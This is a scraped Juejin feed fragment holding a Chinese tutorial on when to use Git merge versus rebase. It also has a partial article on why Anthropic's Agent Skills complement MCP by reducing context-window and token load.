<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8ZDl_-gzCVWrvGAe-VNe8Q" target="_blank" title="https://mp.weixin.qq.com/s/8ZDl_-gzCVWrvGAe-VNe8Q" ref="nofollow noopener noreferrer">ArcGIS Pro 添加底图的方式</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FE9BrT9VzidvziCayXgRCQA" target="_blank" title="https://mp.weixin.qq.com/s/E9BrT9VzidvziCayXgRCQA" ref="nofollow noopener noreferrer">为什么每次打开 ArcGIS Pro 页面加载都如此缓慢？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhBXfq6zRK9twSicMXw69jw" target="_blank" title="https://mp.weixin.qq.com/s/hBXfq6zRK9twSicMXw69jw" ref="nofollow noopener noreferrer">ArcGIS Pro 实现影像波段合成</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQVFiW5C5wXQ6a1WODCaH0g" target="_blank" title="https://mp.weixin.qq.com/s/QVFiW5C5wXQ6a1WODCaH0g" ref="nofollow noopener noreferrer">自然资源部党组关于苗泽等4名同志职务任免的通知</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FJmv3J_bjbBG-4jB72zS3hw" target="_blank" title="https://mp.weixin.qq.com/s/Jmv3J_bjbBG-4jB72zS3hw" ref="nofollow noopener noreferrer">GDAL 创建矢量图层的两种方式</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FwkHv2NnJfuPhtyjJcFLrEQ" target="_blank" title="https://mp.weixin.qq.com/s/wkHv2NnJfuPhtyjJcFLrEQ" ref="nofollow noopener noreferrer">GDAL 实现矢量数据转换处理（全）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FMZIQ57Ka3NQfKFi9AuEQEg" target="_blank" title="https://mp.weixin.qq.com/s/MZIQ57Ka3NQfKFi9AuEQEg" ref="nofollow noopener noreferrer">GDAL 实现投影转换</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FSX2u2ww1iNOtqR5m3BE93g" target="_blank" title="https://mp.weixin.qq.com/s/SX2u2ww1iNOtqR5m3BE93g" ref="nofollow noopener noreferrer">国产版的Google Earth，吉林一号卫星App“共生地球”来了</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FfWufqSyplniNj4Q3BRRbAQ" target="_blank" title="https://mp.weixin.qq.com/s/fWufqSyplniNj4Q3BRRbAQ" ref="nofollow noopener noreferrer">2026年全国自然资源工作会议召开</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FRq7mCSrKU7DA7WRGDEy6Cg" target="_blank" title="https://mp.weixin.qq.com/s/Rq7mCSrKU7DA7WRGDEy6Cg" ref="nofollow noopener noreferrer">日本欲打造“本土版”星链系统</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 年 掌握 Git Merge 与 Rebase 避免代码冲突]]></title>    <link>https://juejin.cn/post/7597317683051560969</link>    <guid>https://juejin.cn/post/7597317683051560969</guid>    <pubDate>2026-01-20T23:19:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597317683051560969" data-draft-id="7597258378590928906" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 年 掌握 Git Merge 与 Rebase 避免代码冲突"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-20T23:19:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 年 掌握 Git Merge 与 Rebase 避免代码冲突
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T23:19:43.000Z" title="Tue Jan 20 2026 23:19:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2026 年 掌握 Git Merge 与 Rebase 避免代码冲突</h2>
<h3 data-id="heading-1">为什么 Git Merge 和 Rebase 依然重要</h3>
<p>在现代软件开发中，多人协作同一代码库已是常态。Git 这类版本控制系统的设计初衷，就是让团队能够同时在不同分支上工作。然而，这种自由也带来了挑战：当需要整合这些分支时，如何管理代码变更、解决冲突？Git 提供了两种主要的合并工具：Git Merge 和 Git Rebase。</p>
<p>这两种操作都能将一个分支的变更合并到另一个分支，但实现方式不同。理解它们的区别，对于保持代码库整洁、避免不必要的冲突、确保项目历史清晰可追溯至关重要。</p>
<p>本文将详细拆解 Git Merge 和 Git Rebase，配合实际示例，帮助你理解何时该用哪一种。读完之后，你将对这两种 Git 策略有扎实的掌握，能够避免那些导致代码冲突的常见陷阱。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fmastering-git-merge-rebase-avoid-code-conflicts" target="_blank" title="https://catchadmin.com/post/2026-01/mastering-git-merge-rebase-avoid-code-conflicts" ref="nofollow noopener noreferrer">原文 2026 年 掌握 Git Merge 与 Rebase 避免代码冲突</a></p>
<h3 data-id="heading-2">什么是 Git Merge？</h3>
<p>Git Merge 是 Git 的基础操作之一，用于将一个分支的变更合并到另一个分支。通常用于将功能分支整合到主分支（一般叫 <code>main</code> 或 <code>master</code>）。Git Merge 会保留两个分支的历史，双方的变更都完整保留。</p>
<p>执行 merge 时，Git 会尝试自动合并两个分支的变更。如果遇到冲突——即两个分支以不兼容的方式修改了同一段代码——Git 会停下来，要求你手动解决冲突。解决后，提交变更即可完成合并。</p>
<h4 data-id="heading-3">Git Merge 工作流示例</h4>
<p>假设你在 <code>feature-branch</code> 上开发，想把它合并到 <code>main</code> 分支。操作步骤如下：</p>
<ol>
<li>先切换到 <code>main</code> 分支（即目标分支）：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git checkout main
</code></pre>
<ol start="2">
<li>执行合并：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git merge feature-branch
</code></pre>
<p>如果没有冲突，Git 会自动创建一个合并提交（merge commit），将两个分支合并。如果有冲突，Git 会暂停并提示哪些文件需要处理。</p>
<ol start="3">
<li>解决 Git 标记的冲突文件，解决后标记为已解决：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git add &lt;conflicted-file&gt;
</code></pre>
<ol start="4">
<li>提交完成合并：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git commit
</code></pre>
<p>这样会生成一个合并提交，记录两个分支的合并。提交历史现在会显示 <code>feature-branch</code> 被合并进了 <code>main</code>，双方历史都得以保留。</p>
<h4 data-id="heading-4">Git Merge 的优缺点</h4>
<p><strong>优点：</strong></p>
<ul>
<li><strong>协作安全</strong>：Merge 不会修改提交历史，适合团队协作。每个开发者都能清楚看到代码的演变过程。</li>
<li><strong>分支历史清晰</strong>：合并提交明确显示分支何时分叉、何时整合，完整保留历史。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>提交历史可能杂乱</strong>：频繁合并会让历史变得混乱，尤其是多个功能分支加上多个合并提交时，追踪特定变更会变得困难。</li>
<li><strong>合并提交有时显得多余</strong>：如果你更喜欢线性历史，合并提交可能会给项目历史增加噪音。</li>
</ul>
<h3 data-id="heading-5">什么是 Git Rebase？</h3>
<p>Git Rebase 是另一种整合分支变更的方式，但它通过重写提交历史来实现。与 Git Merge 创建合并提交不同，Git Rebase 会把你的变更重新应用到目标分支（通常是 <code>main</code>）之上，形成线性的提交历史，没有合并提交。</p>
<p>Rebase 能让项目历史更干净，因为它消除了不必要的合并提交。但 rebase 会重写提交历史，在协作环境中可能带来风险，尤其是当你已经把分支推送给其他人时。</p>
<h4 data-id="heading-6">Git Rebase 工作流示例</h4>
<p>假设你在 <code>feature-branch</code> 上开发，想把它 rebase 到 <code>main</code> 分支以获取最新变更。操作步骤如下：</p>
<ol>
<li>先切换到你的 <code>feature-branch</code>：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git checkout feature-branch
</code></pre>
<ol start="2">
<li>将 <code>feature-branch</code> rebase 到 <code>main</code>：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git rebase main
</code></pre>
<p>Git 会把 <code>feature-branch</code> 上的提交逐个重放到当前 <code>main</code> 分支之上，相当于让 <code>feature-branch</code> 包含了 <code>main</code> 的所有最新变更。如果没有冲突，rebase 会自动完成。</p>
<ol start="3">
<li>解决 rebase 过程中出现的冲突。Git 会在每个冲突处停下来让你处理：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 解决文件中的冲突</span>
git add &lt;conflicted-file&gt;
</code></pre>
<ol start="4">
<li>解决每个冲突后继续 rebase：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git rebase --<span class="hljs-built_in">continue</span>
</code></pre>
<ol start="5">
<li>将 rebase 后的分支推送到远程仓库（注意：如果之前已经推送过这个分支，可能需要强制推送）：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">git push --force
</code></pre>
<p>现在，你的 <code>feature-branch</code> 在 <code>main</code> 之上有了线性的提交历史，可以创建 pull request 合并到 <code>main</code> 了。</p>
<h4 data-id="heading-7">Git Rebase 的优缺点</h4>
<p><strong>优点：</strong></p>
<ul>
<li><strong>干净的线性历史</strong>：Rebase 避免了合并提交的杂乱，项目历史更简洁易懂。</li>
<li><strong>简化代码审查</strong>：线性历史让审查者更容易跟踪代码演变，理解每个变更。</li>
<li><strong>避免不必要的合并提交</strong>：频繁与主分支同步时，rebase 能保持历史整洁。</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>重写提交历史</strong>：Rebase 会改变提交历史，在团队协作中可能引发问题。如果其他人基于你的分支工作，rebase 可能导致冲突和混乱。</li>
<li><strong>出错风险</strong>：使用不当时，rebase 可能导致提交丢失或混乱，尤其是对解决 rebase 冲突不熟练的情况下。</li>
</ul>
<h3 data-id="heading-8">Git Merge 与 Git Rebase 的核心区别</h3>
<p>选择使用哪种策略时，理解两者的区别很重要。以下是对比概览：</p>
<p><strong>提交历史：</strong>
Git Merge 保留提交历史，创建一个新的合并提交来整合分支。这保持了历史完整，但频繁合并可能导致提交日志杂乱。而 Git Rebase 重写提交历史，生成干净的线性提交序列，没有合并提交。</p>
<p><strong>冲突解决：</strong>
Merge 时，冲突在合并发起后解决。Git 会停下来让你解决冲突后再继续。Rebase 时，冲突在 rebase 过程中解决，因为每个提交是逐个重新应用的，需要在每一步解决冲突。</p>
<p><strong>协作场景：</strong>
Git Merge 在协作环境中通常更安全，因为它不重写历史，适合在共享分支上使用。Rebase 会重写历史，可能给基于你分支工作的同事带来问题。在私有分支或没有其他人在用的分支上 rebase 更安全。</p>
<p><strong>历史清晰度：</strong>
Rebase 通过消除合并提交提供更干净的线性历史，适合希望开发历史呈直线的场景。合并提交虽然保留了更多历史信息，但可能导致更复杂的提交历史，浏览和审查起来更困难。</p>
<h3 data-id="heading-9">最佳实践：何时用 Merge，何时用 Rebase</h3>
<p><strong>使用 Git Merge 的场景：</strong></p>
<ul>
<li>想保留分支开发的完整历史</li>
<li>在共享分支上工作，需要避免重写历史</li>
<li>想清楚看到不同分支何时被整合</li>
<li>能接受稍复杂的历史，只要它反映了每个分支的贡献</li>
</ul>
<p><strong>使用 Git Rebase 的场景：</strong></p>
<ul>
<li>想保持干净的线性历史，尤其是在将功能分支合并到 <code>main</code> 之前</li>
<li>独自在功能分支上工作，想与 <code>main</code> 保持同步但不想产生不必要的合并提交</li>
<li>想在提交 pull request 前简化提交历史，方便审查</li>
</ul>
<h3 data-id="heading-10">常见错误及避免方法</h3>
<ul>
<li><strong>在共享分支上 Rebase</strong>：Git Rebase 最常见的错误是在其他人正在使用的分支上重写历史，这会给队友带来困惑和错误。</li>
<li><strong>冲突解决不当</strong>：无论用 merge 还是 rebase，都要仔细解决冲突。跳过这一步可能导致代码损坏或变更丢失。</li>
<li><strong>Rebase 后忘记推送</strong>：如果 rebase 后忘记强制推送，远程分支不会反映 rebase 后的变更。务必在 rebase 后推送，必要时使用强制推送。</li>
<li><strong>复杂合并场景下使用 Rebase</strong>：如果分支分叉严重，难以干净地 rebase，Git Merge 可能是更安全、更简单的选择。</li>
</ul>
<h3 data-id="heading-11">总结</h3>
<p>在 2026 年，Git 仍然是软件开发不可或缺的工具，理解 Git Merge 和 Git Rebase 的区别对于保持高效工作流至关重要。两种操作各有优劣，关键在于知道何时使用哪一种。</p>
<p>Git Merge 适合保留完整的分支历史，在协作环境中更安全；Git Rebase 擅长保持整洁的线性历史，适合精简项目提交记录、简化代码审查。</p>
<p>通过实践这两种策略并理解它们的影响，你可以避免代码冲突，保持项目历史整洁，成为更高效的开发者。选择合适的工具，祝你在 2026 年编码愉快！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[有了MCP，为什么你还需要skills]]></title>    <link>https://juejin.cn/post/7597266967138746402</link>    <guid>https://juejin.cn/post/7597266967138746402</guid>    <pubDate>2026-01-20T21:43:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597266967138746402" data-draft-id="7597326073671876623" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="有了MCP，为什么你还需要skills"/> <meta itemprop="keywords" content="算法,人工智能"/> <meta itemprop="datePublished" content="2026-01-20T21:43:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MobotStone"/> <meta itemprop="url" content="https://juejin.cn/user/3839909554568840"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            有了MCP，为什么你还需要skills
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3839909554568840/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MobotStone
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T21:43:08.000Z" title="Tue Jan 20 2026 21:43:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近 Anthropic 又刷了一波存在感。作为最早把 MCP 这个概念带火的“开拓者”，他们显然没打算停下来：这两天又提出了一个新概念，叫<strong>Skills</strong>。更关键的是，Anthropic 还****把<strong>Agent Skills</strong>以<strong>开放标准</strong>的形式正式发布出来了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01fa0aa50d8449268ae00839e113a909~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9ib3RTdG9uZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769550188&amp;x-signature=pCMQyKvkEyBg2kr6TUqt4z5kvbE%3D" alt="image.png" loading="lazy"/></p>
<p>乍一看，MCP（模型上下文协议）和 Skills 就像是给大模型装上的各种“外挂”或者“插件”。既然已经有了 MCP 这种能让 AI 联网、读数据的标准，为什么还要搞出一个叫 Skills 的新概念？这到底是技术真的升级了，还是又一次“换个名字继续讲”的概念膨胀？</p>
<p>其实，搞技术开发的核心目标就三个：能不能方便扩展、靠不靠谱、值不值得（成本是否划算）。很多看起来“新东西”的出现，其实都是围绕这三点在优化。</p>
<p>从这个角度出发，Skills 之所以出现，是因为现有架构在实际落地时暴露了一些明显的痛点，而它正是用来针对这些问题做补齐和改进的。</p>
<h3 data-id="heading-0">为什么有了 MCP，还需要 SKILLS？</h3>
<p>之所以在 MCP 生态日渐成熟后又引入 SKILLS，核心原因主要归结于以下两点现实约束与定位缺失：</p>
<p>MCP 生态越来越成熟之后，MCP 虽然好用，但随着功能变强，它也变得越来越“臃肿”。引入<strong>SKILLS</strong>，本质上是为了给模型“减负”和“省钱”。</p>
<h4 data-id="heading-1">1) 现实限制：上下文窗口容易“被撑爆”，还显得笨重</h4>
<p>比如前段时间探索<strong>Playwright MCP</strong>， 给模型加上浏览器自动化能力。为了让模型“会用”这个工具，往往需要在提示词/上下文里塞进很多东西：</p>
<ul>
<li>Playwright 一大堆 API 定义</li>
<li>各种参数结构说明</li>
<li>甚至还有当前页面的 DOM 树信息</li>
</ul>
<p>这些内容一多，<strong>上下文窗口很快就被占满</strong>，系统也显得笨重、不灵活。</p>
<p>更麻烦的是：<strong>工具调用过程中产生的中间结果也要占 token</strong>。在典型的 MCP 流程里，模型不仅要做决策，还常常要负责“转发/整理数据”（有点像数据路由器），于是中间数据来来回回，token 消耗就被放大了。</p>
<p>官方举的例子也能说明这个问题：当你让 Agent 执行“从 Google Drive 下载会议记录，并把它附加到 Salesforce 的线索里”这种跨工具任务时，过程中会产生很多步骤和中间信息，而这些都会持续挤占上下文和 token(太费钱了)。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e773a8b43b5b42858aaa73be09612a5d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9ib3RTdG9uZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769550188&amp;x-signature=4nrqdTmn5n%2FZPLBWcXPyXCq9ilo%3D" alt="" loading="lazy"/></p>
